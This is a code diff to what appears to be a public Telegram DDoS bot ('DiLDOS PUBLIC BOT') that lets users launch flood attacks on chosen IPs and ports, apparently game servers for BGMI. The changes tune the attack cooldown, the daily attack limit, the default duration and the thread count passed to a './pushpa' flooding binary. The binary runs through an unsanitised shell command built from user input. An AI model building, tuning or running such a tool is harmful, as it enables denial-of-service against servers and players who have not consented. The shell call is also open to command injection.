@@ -24,9 +24,9 @@ user_bans = {}  # Tracks user ban status and ban expiry time
 reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=10))).replace(hour=0, minute=0, second=0, microsecond=0)
 
 # Cooldown duration (in seconds)
-COOLDOWN_DURATION = 180  # 5 minutes
+COOLDOWN_DURATION = 300  # 5 minutes
 BAN_DURATION = timedelta(minutes=1)  
-DAILY_ATTACK_LIMIT = 15  # Daily attack limit per user
+DAILY_ATTACK_LIMIT = 9  # Daily attack limit per user
 
 # List of user IDs exempted from cooldown, limits, and photo requirements
 EXEMPTED_USERS = [6768273586, 7479349647]
@@ -315,7 +315,7 @@ def bgmi_command(message):
             user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)
 
         # Notify that the attack will run for the default duration of 150 seconds, but display the input duration
-        default_duration = 150
+        default_duration = 80
         
         remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
         
@@ -337,7 +337,7 @@ def bgmi_command(message):
 
 async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
     try:
-        command = f" ./pushpa {target_ip} {target_port} {duration} 900"
+        command = f" ./pushpa {target_ip} {target_port} {duration} 500"
         process = await asyncio.create_subprocess_shell(command)
         await process.communicate()
         bot.send_message(CHANNEL_ID, f"‼️𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!‼️\n\n𝐓𝐀𝐑𝐆𝐄𝐓 -> {target_ip}\n𝐏𝐎𝐑𝐓 -> {target_port} 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱✅ \n[ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝙏𝙁_𝙁𝙇𝘼𝙎𝙃 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧")
